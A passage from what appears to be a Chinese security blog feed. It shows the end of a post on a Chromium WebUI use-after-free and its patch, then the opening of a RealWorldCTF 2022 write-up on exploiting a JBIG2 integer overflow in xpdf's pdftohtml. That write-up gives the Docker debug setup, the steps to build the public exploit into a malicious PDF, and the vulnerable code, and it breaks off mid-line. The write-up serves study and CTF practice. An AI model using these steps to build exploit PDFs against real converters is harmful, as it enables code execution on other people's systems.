chrome://support-tool/ source.</span></span><br><span class="line">  Profile* profile = Profile::FromWebUI(web_ui);</span><br><span class="line">  content::WebUIDataSource::Add(</span><br><span class="line">      profile, CreateSupportToolHTMLSource(web_ui-&gt;GetWebContents()-&gt;GetURL()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SupportToolUI::~SupportToolUI() = <span class="keyword">default</span>;</span><br><span class="line">  **select_file_dialog_ = ui::SelectFileDialog::Create(</span><br><span class="line">      <span class="keyword">this</span>,** <span class="comment">//----------&gt; [1]</span></span><br><span class="line">      **<span class="built_in">std</span>::make_unique&lt;ChromeSelectFilePolicy&gt;(web_ui()-&gt;GetWebContents()));**</span><br><span class="line"></span><br><span class="line">  select_file_dialog_-&gt;SelectFile(</span><br><span class="line">      ui::SelectFileDialog::SELECT_SAVEAS_FILE,</span><br><span class="line">      <span class="comment">/*title=*/</span><span class="built_in">std</span>::u16string(),</span><br><span class="line">      <span class="comment">/*default_path=*/</span></span><br><span class="line">      GetDefaultFileToExport(handler_-&gt;GetCaseID(), data_collection_time_),</span><br><span class="line">      <span class="comment">/*file_types=*/</span><span class="literal">nullptr</span>,</span><br><span class="line">      <span class="comment">/*file_type_index=*/</span><span class="number">0</span>,</span><br><span class="line">      <span class="comment">/*default_extension=*/</span>base::FilePath::StringType(), owning_window,</span><br><span class="line">      <span class="comment">/*params=*/</span><span class="literal">nullptr</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The listener to be notified of selection completion.</span></span><br><span class="line">raw_ptr&lt;Listener&gt; listener_;</span><br><span class="line">SelectFileDialog::SelectFileDialog(Listener* listener,</span><br><span class="line">                                   <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;ui::SelectFilePolicy&gt; policy)</span><br><span class="line">    : **listener_(listener)**, select_file_policy_(<span class="built_in">std</span>::move(policy)) &#123; <span class="comment">// [2]</span></span><br><span class="line">  DCHECK(listener_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SelectFileDialogImpl::OnSelectFileExecuted</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Type type,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;RunState&gt; run_state,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">void</span>* params,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;base::FilePath&gt;&amp; paths,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (listener_) &#123;</span><br><span class="line">    <span class="comment">// The paths vector is empty when the user cancels the dialog.</span></span><br><span class="line">    <span class="keyword">if</span> (paths.empty()) &#123;</span><br><span class="line">      listener_-&gt;FileSelectionCanceled(params);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="keyword">case</span> SELECT_FOLDER:</span><br><span class="line">        <span class="keyword">case</span> SELECT_UPLOAD_FOLDER:</span><br><span class="line">        <span class="keyword">case</span> SELECT_EXISTING_FOLDER:</span><br><span class="line">        <span class="keyword">case</span> SELECT_SAVEAS_FILE:</span><br><span class="line">        <span class="keyword">case</span> SELECT_OPEN_FILE:</span><br><span class="line">          DCHECK_EQ(paths.size(), <span class="number">1u</span>);</span><br><span class="line">          listener_-&gt;FileSelected(paths[<span class="number">0</span>], index, params); <span class="comment">// [3]</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SELECT_OPEN_MULTI_FILE:</span><br><span class="line">          listener_-&gt;MultiFilesSelected(paths, params);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SELECT_NONE:</span><br><span class="line">          NOTREACHED();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  EndRun(<span class="built_in">std</span>::move(run_state));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~SupportToolMessageHandler() <span class="keyword">override</span> = <span class="keyword">default</span>; <span class="comment">// [4]</span></span><br></pre></td></tr></table></figure><ul><li>patch</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SupportToolMessageHandler::~SupportToolMessageHandler() &#123;</span><br><span class="line">  <span class="keyword">if</span> (select_file_dialog_) &#123;</span><br><span class="line">    select_file_dialog_-&gt;ListenerDestroyed();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SupportToolMessageHandler::HandleStartDataExport</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> base::Value::List&amp; args)</span> </span>&#123;</span><br><span class="line">  CHECK_EQ(<span class="number">1U</span>, args.size());</span><br><span class="line">  <span class="keyword">const</span> base::Value::List* pii_items = args[<span class="number">0</span>].GetIfList();</span><br><span class="line">  DCHECK(pii_items);</span><br><span class="line">  <span class="comment">// Early return if the select file dialog is already active.</span></span><br><span class="line">  <span class="keyword">if</span> (select_file_dialog_)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  selected_pii_to_keep_ = GetSelectedPIIToKeep(pii_items);</span><br></pre></td></tr></table></figure><h2 id="other-case-2"><a href="#other-case-2" class="headerlink" title="other case"></a>other case</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1305068" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1305068</a></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1306391" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1306391</a></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1304884" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1304884</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;“WebUI “是一个术语，用于宽泛地描述用网络技术（即HTML、CSS、JavaScript）实现的Chrome浏览器的部分UI。&lt;/p&gt;
&lt;p&gt;Chromium中的WebUI的例子。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Settings (chrome://settings)&lt;/
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="webui" scheme="http://eternalsakura13.com/tags/webui/"/>
    
  </entry>
  
  <entry>
    <title>realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析</title>
    <link href="http://eternalsakura13.com/2022/02/10/hso/"/>
    <id>http://eternalsakura13.com/2022/02/10/hso/</id>
    <published>2022-02-10T09:48:08.111Z</published>
    <updated>2022-02-10T09:59:51.543Z</updated>
    
    <content type="html"><![CDATA[<h1 id="realworldctf-2022-hso-writeup与nso-iMessage-0click漏洞分析"><a href="#realworldctf-2022-hso-writeup与nso-iMessage-0click漏洞分析" class="headerlink" title="realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析"></a>realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析</h1><p>欢迎大家关注公众号”天问记事簿”，以及加入天问之路知识星球，一起做技术分享，一起学习，happy hack。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本题的考点可能来源于Project Zero的<strong>A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution</strong>一文，这篇文章介绍了一个图片渲染库的整数溢出漏洞，以及如何通过这个漏洞来利用这个解析库原有的处理像素数据的与或非功能，构建了一个图灵完备的小型计算机，从而完成后续的漏洞利用。</p><p>但由于Linux平台相比，缓解机制并不完善，以及我们不需要对接一个sandbox escape漏洞来逃逸imessage沙箱，所以只需要简单的构建一个全加器就可以实现整个漏洞利用，体验到神奇的乐趣。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095423.jpg" alt=""></p><p>这里是复盘 RWCTF2022 中 <code>hso groupie</code> 题时所写下的一些笔记，在做题的过程中，我们大量阅读了<a href="https://github.com/agl/jbig2enc/blob/ea6a40a2cbf05efb00f3418f2d0ad71232565beb/fcd14492.pdf" target="_blank" rel="noopener">fcd14492标准文档</a>，如果你在做题或者阅读本文的过程中感觉难以理解，请参考文档的第0章/第7章和第6章等，想必会有所收获，感谢<strong><a href="https://github.com/Riatre" target="_blank" rel="noopener">Riatre</a>师傅提供的有趣题目。</strong></p><p>整体的做题思路主要由作者 exploit 中所推导出，换句话说，这里的笔记主要是对 <a href="https://github.com/Riatre/hso-groupie/tree/master/exploit" target="_blank" rel="noopener">作者 exploit</a> 的解释说明。</p><p>由于这题同样也较为复杂，因此需要单独开一个博文来记录。</p><h2 id="一、小叙"><a href="#一、小叙" class="headerlink" title="一、小叙"></a>一、小叙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Help check how secure our latest PaaS (Pdftohtml-as-a-Service) is!</span><br><span class="line">Pick your favorite bug from this bloody list, or really, just exploit that bug so your exploit would also work on latest Poppler [1] and maybe even KItinerary.</span><br><span class="line">The container image is also available on Docker Hub.</span><br><span class="line">[1] Yeah, turns out propagating bug fixes between different Clone-and-Own codebases takes time :)</span><br><span class="line">socat -t90 stdio tcp-connect:47.242.147.191:31337</span><br><span class="line">attachment</span><br><span class="line"></span><br><span class="line">Clone-and-Pwn, difficulty:hard</span><br></pre></td></tr></table></figure><p>这题是 clone-and-pwn，源码没有做任何改变，就是通过查看最近提交的漏洞修复记录来发掘并利用漏洞。</p><h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><h3 id="1-本地环境搭建"><a href="#1-本地环境搭建" class="headerlink" title="1. 本地环境搭建"></a>1. 本地环境搭建</h3><blockquote><p>这一题是在 debian 下编译的，因此对于 debian 系统来说，有些系统可以直接跑 exp（例如我的 XD）。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;dl.xpdfreader.com&#x2F;xpdf-4.03.tar.gz</span><br><span class="line">tar -zxvf xpdf-4.03.tar.gz</span><br><span class="line">cd xpdf-4.03</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE&#x3D;Debug -DCMAKE_CXX_FLAGS&#x3D;&quot;-D_FORTIFY_SOURCE&#x3D;2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0&quot; ..</span><br><span class="line">make -j &#96;nproc&#96;</span><br><span class="line"></span><br><span class="line"># 题目还给了一个 &#96;GNU C Library (Debian GLIBC 2.33-2) release&#96; 的 glibc 附件</span><br><span class="line">patchelf --replace-needed libc.so.6 $&#123;PWD&#125;&#x2F;..&#x2F;..&#x2F;libc.so.6 .&#x2F;xpdf&#x2F;pdftohtml</span><br></pre></td></tr></table></figure><p>启动方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpdf&#x2F;pdftohtml &lt;pdf-path&gt; --</span><br></pre></td></tr></table></figure><h3 id="2-exploit-调试环境搭建"><a href="#2-exploit-调试环境搭建" class="headerlink" title="2. exploit 调试环境搭建"></a>2. exploit 调试环境搭建</h3><p>去 <a href="https://github.com/Riatre/hso-groupie/tree/master/chall" target="_blank" rel="noopener">题目环境</a> 这里下载 dockerfile 等题目环境，之后给 dockerfile 打 patch：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">--- a&#x2F;Dockerfile</span><br><span class="line">+++ b&#x2F;Dockerfile</span><br><span class="line">@@ -8,7 +8,7 @@ RUN cd &#x2F;tmp&#x2F;xpdf-4.03 &amp;&amp; \</span><br><span class="line">     mkdir build &amp;&amp; \</span><br><span class="line">     cd build &amp;&amp; \</span><br><span class="line">     cmake -DCMAKE_BUILD_TYPE&#x3D;Release \</span><br><span class="line">-        -DCMAKE_CXX_FLAGS&#x3D;&quot;-D_FORTIFY_SOURCE&#x3D;2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro&quot; .. &amp;&amp; \</span><br><span class="line">+        -DCMAKE_CXX_FLAGS&#x3D;&quot;-D_FORTIFY_SOURCE&#x3D;2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0 &quot; .. &amp;&amp; \</span><br><span class="line">     make -j$(nproc)</span><br><span class="line"></span><br><span class="line"> FROM debian:unstable-20211220-slim</span><br><span class="line">@@ -20,6 +20,7 @@ RUN echo &quot;deb [check-valid-until&#x3D;no] http:&#x2F;&#x2F;snapshot.debian.org&#x2F;archive&#x2F;debian&#x2F;2</span><br><span class="line">     apt-get install -y fonts-arkpandora fonts-noto fonts-dejavu fonts-font-awesome fonts-lato fonts-powerline gsfonts &amp;&amp; \</span><br><span class="line">     apt-get clean &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*</span><br><span class="line"> COPY --from&#x3D;build &#x2F;tmp&#x2F;xpdf-4.03&#x2F;build&#x2F;xpdf&#x2F;pdftohtml &#x2F;usr&#x2F;local&#x2F;bin&#x2F;</span><br><span class="line">+COPY gdbserver &#x2F;usr&#x2F;bin&#x2F;gdbserver</span><br><span class="line"> RUN mkdir -p &#x2F;run&#x2F;secrets &amp;&amp; echo &#39;rwctf&#123;flag placeholder&#125;&#39; &gt; &#x2F;run&#x2F;secrets&#x2F;flag</span><br><span class="line"></span><br><span class="line">-ENTRYPOINT [ &quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, &quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;pdftohtml \&quot;$@\&quot;&quot;, &quot;--&quot; ]</span><br><span class="line">\ No newline at end of file</span><br><span class="line">+ENTRYPOINT [ &quot;&#x2F;bin&#x2F;sh&quot;]</span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure><p>修改目的主要是把 gdbserver 放进镜像里，以及让入口点停在 <code>/bin/sh</code>，而不直接启动 pdftohtml。</p><blockquote><p>这里要注意 COPY 命令的源路径，这里是直接使用相对路径。</p></blockquote><p>执行 <code>build.sh</code>，执行完成后可以检查一下镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  chall git:(master) docker image ls</span><br><span class="line">REPOSITORY             TAG                      IMAGE ID       CREATED             SIZE</span><br><span class="line">hsogroupie&#x2F;pdftohtml   latest                   042e72a0f133   45 minutes ago      946MB</span><br></pre></td></tr></table></figure><p>启动 docker 镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 1234:1234 -v sakura_volume:&#x2F;tmp&#x2F;chall --cap-add&#x3D;SYS_PTRACE --security-opt seccomp&#x3D;unconfined --name hsogroupie hsogroupie&#x2F;pdftohtml</span><br></pre></td></tr></table></figure><p>该命令非常长，解构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run --help</span><br><span class="line"></span><br><span class="line">-i : 进入交互模式</span><br><span class="line">-t : 分配一个伪shell</span><br><span class="line">-d : 在后台以守护模式运行容器</span><br><span class="line">-p : 宿主机端口:容器端口，将容器端口映射到宿主机端口，这里都指定1234就好了</span><br><span class="line">-v : 挂载数据卷</span><br><span class="line">--cap-add&#x3D;SYS_PTRACE --security-opt seccomp&#x3D;unconfined : Docker默认禁用PTRACE功能，需要指定这个命令</span><br><span class="line">--name : 给容器声明一个名字</span><br></pre></td></tr></table></figure><p>这里挂载数据卷需要额外说明（参考<a href="https://www.cnblogs.com/edisonchou/p/docker_volumes_introduction.html" target="_blank" rel="noopener">这篇文章</a>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker volume create sakura_volume &#x2F;&#x2F; 创建一个自定义容器卷</span><br><span class="line">docker volume ls &#x2F;&#x2F; 查看所有容器卷</span><br><span class="line">docker volume inspect sakura_volume &#x2F;&#x2F; 查看指定容器卷详情信息</span><br><span class="line">...</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;CreatedAt&quot;: &quot;2022-02-02T01:29:55+08:00&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Mountpoint&quot;: &quot;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;sakura_volume&#x2F;_data&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;sakura_volume&quot;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>然后我们对 <code>/var/lib/docker/volumes/sakura_volume/_data</code> 的修改就会映射到容器的 <code>/tmp/chall</code> 里，传输文件就比较方便。</p><p>启动完了之后我们可以 <code>docker ps</code> 一下看看有没有问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  chall git:(master) docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE                  COMMAND     CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">15f265c337c0   hsogroupie&#x2F;pdftohtml   &quot;&#x2F;bin&#x2F;sh&quot;   34 minutes ago   Up 34 minutes   0.0.0.0:1234-&gt;1234&#x2F;tcp, :::1234-&gt;1234&#x2F;tcp   hsogroupie</span><br></pre></td></tr></table></figure><p>生成 exp pdf，注意要对 submodule 初始化，不然没有 jbig2enc 库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Riatre&#x2F;hso-groupie.git</span><br><span class="line">cd hso-groupie&#x2F;exploit</span><br><span class="line">git submodule update --init</span><br><span class="line">cd ..</span><br><span class="line">sudo cp -r exploit &#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;sakura_volume&#x2F;_data</span><br></pre></td></tr></table></figure><p>然后我们进入 docker 容器里对应数据卷的 exploit 目录下，应该要 install 这些安装包，要是少了就自己补一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install make g++ python3 pybind11-dev python3-dev python2 python2-dev</span><br><span class="line">make</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root@15f265c337c0:&#x2F;tmp&#x2F;chall&#x2F;exploit# make</span><br><span class="line">g++ -O3 -std&#x3D;c++20 -shared -fPIC jbig2arith.cc jbig2arith.h jbjbarith.cc jbjbarith.h -ojbjbarith.cpython-39-x86_64-linux-gnu.so -I&#x2F;usr&#x2F;include&#x2F;python3.9 -I&#x2F;usr&#x2F;include&#x2F;python3.9</span><br><span class="line">python3 sploit.py</span><br><span class="line">python2 pdf.py sploit &gt; sploit.pdf</span><br></pre></td></tr></table></figure><p>调试 exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 15f265c337c0 bash</span><br></pre></td></tr></table></figure><p>进入容器的 bash 环境，然后启动 gdbserver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf output &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;gdbserver :1234 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pdftohtml &#x2F;tmp&#x2F;chall&#x2F;exploit&#x2F;sploit.pdf output</span><br></pre></td></tr></table></figure><p>这里的 output 是随便给一个文件夹名就行了，这是 pdftohtml 必须的启动参数，它会创建这个文件夹，并输出一个结果到这个文件夹里，并且它不能是已经存在的文件夹，而 sploit.pdf 就是我们生成出来的 exp pdf 文件。</p><p>然后在宿主机也启动 gdb，然后 <code>target remote:1234</code>，然后随便下个断点看看效果，注意因为 docker 里的源码路径和我宿主机的源码路径并不一致，所以要用 <code>substitute-path</code> 做个转换，建议写个 gdb 脚本完成这个事情，后面就不用一直自己敲了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br><span class="line">set substitute-path  &#x2F;tmp&#x2F;xpdf-4.03&#x2F;xpdf &#x2F;home&#x2F;sakura&#x2F;ctf&#x2F;hso-groupie&#x2F;chall&#x2F;xpdf-4.03&#x2F;xpdf</span><br><span class="line">b findSegment</span><br><span class="line">c</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> ► 0x555555675179    mov    r8, qword ptr [rax]</span><br><span class="line">   0x55555567517c    cmp    dword ptr [r8 + 8], esi</span><br><span class="line">   0x555555675180    jne    0x555555675170                &lt;0x555555675170&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x555555675170    add    rax, 8</span><br><span class="line">   0x555555675174    cmp    rax, rdx</span><br><span class="line">   0x555555675177    je     0x555555675190                &lt;0x555555675190&gt;</span><br><span class="line">───────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────</span><br><span class="line">In file: &#x2F;home&#x2F;sakura&#x2F;ctf&#x2F;hso-groupie&#x2F;chall&#x2F;xpdf-4.03&#x2F;xpdf&#x2F;JBIG2Stream.cc</span><br><span class="line">   4036 JBIG2Segment *JBIG2Stream::findSegment(Guint segNum) &#123;</span><br><span class="line">   4037   JBIG2Segment *seg;</span><br><span class="line">   4038   int i;</span><br><span class="line">   4039</span><br><span class="line">   4040   for (i &#x3D; 0; i &lt; globalSegments-&gt;getLength(); ++i) &#123;</span><br><span class="line"> ► 4041     seg &#x3D; (JBIG2Segment *)globalSegments-&gt;get(i);</span><br><span class="line">   4042     if (seg-&gt;getSegNum() &#x3D;&#x3D; segNum) &#123;</span><br><span class="line">   4043       return seg;</span><br><span class="line">   4044     &#125;</span><br><span class="line">   4045   &#125;</span><br><span class="line">   4046   for (i &#x3D; 0; i &lt; segments-&gt;getLength(); ++i) &#123;</span><br><span class="line">───────────────────────────────────────────[ STACK ]────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffdd28 —▸ 0x555555676c72 ◂— mov    r12, rax</span><br><span class="line">01:0008│     0x7fffffffdd30 ◂— 0x0</span><br><span class="line">02:0010│     0x7fffffffdd38 ◂— 0x0</span><br><span class="line">03:0018│     0x7fffffffdd40 —▸ 0x555561ec0f00 ◂— 0x200000001</span><br><span class="line">04:0020│     0x7fffffffdd48 —▸ 0x555561f40c64 ◂— 0x203a100000000</span><br><span class="line">05:0028│     0x7fffffffdd50 ◂— 0x0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────</span><br><span class="line"> ► f 0   0x555555675179</span><br><span class="line">   f 1   0x555555676c72</span><br><span class="line">   f 2   0x555555679198 JBIG2Stream::readSegments()+1032</span><br><span class="line">   f 3   0x555555679473 JBIG2Stream::reset()+211</span><br><span class="line">   f 4   0x55555560139a</span><br><span class="line">   f 5   0x5555556494a9</span><br><span class="line">   f 6   0x55555564aba0</span><br><span class="line">   f 7   0x55555563c9e5</span><br></pre></td></tr></table></figure><p>现在我们就完成了整个调试环境的搭建。</p><h2 id="三、漏洞点"><a href="#三、漏洞点" class="headerlink" title="三、漏洞点"></a>三、漏洞点</h2><p>这题预期的解法是使用这篇 google project zero 的 <a href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html" target="_blank" rel="noopener">iMessage exploit</a> 中的漏洞。漏洞点位于 <code>JBIG2Stream</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                    GBool lossless, Guint length,</span><br><span class="line">                    Guint *refSegs, Guint nRefSegs) &#123;</span><br><span class="line">  ...</span><br><span class="line">  Guint numSyms;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; get symbol dictionaries and tables</span><br><span class="line">  codeTables &#x3D; new GList();</span><br><span class="line">  &#x2F;&#x2F; 1. 初始时为 0</span><br><span class="line">  numSyms &#x3D; 0;</span><br><span class="line">  for (i &#x3D; 0; i &lt; nRefSegs; ++i) &#123;</span><br><span class="line">    if ((seg &#x3D; findSegment(refSegs[i]))) &#123;</span><br><span class="line">      if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegSymbolDict) &#123;</span><br><span class="line">        &#x2F;&#x2F; 2. 该变量与一个用户可控的值相加，会造成整数溢出</span><br><span class="line">        numSyms +&#x3D; ((JBIG2SymbolDict *)seg)-&gt;getSize();</span><br><span class="line">      &#125; else if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegCodeTable) &#123;</span><br><span class="line">        codeTables-&gt;append(seg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; get the symbol bitmaps</span><br><span class="line">  &#x2F;&#x2F; 3. 整数溢出后，这里分配了一个较小的堆内存（指针数组）</span><br><span class="line">  syms &#x3D; (JBIG2Bitmap **)gmallocn(numSyms, 